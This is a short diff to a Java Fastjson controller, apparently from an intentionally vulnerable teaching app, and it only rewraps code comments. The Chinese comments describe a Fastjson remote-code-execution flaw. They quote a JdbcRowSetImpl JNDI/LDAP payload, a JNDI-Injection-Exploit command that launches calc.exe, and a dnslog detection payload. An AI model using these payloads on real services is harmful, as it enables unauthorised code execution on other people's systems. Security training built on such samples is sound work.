@@ -22,9 +22,11 @@ public class FastjsonController {
      * 存在Fastjson RCE漏洞，攻击者发送如下数据，即可执行命令
      * {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/1dus4n","autoCommit":true}
      *
-     * 开启ldap server: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A "127.0.0.1"
+     * 开启ldap server: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C
+     * "calc.exe" -A "127.0.0.1"
      *
-     * 使用dnslog验证: {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}
+     * 使用dnslog验证:
+     * {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}
      */
     @ApiOperation("存在漏洞")
     @GetMapping("1")
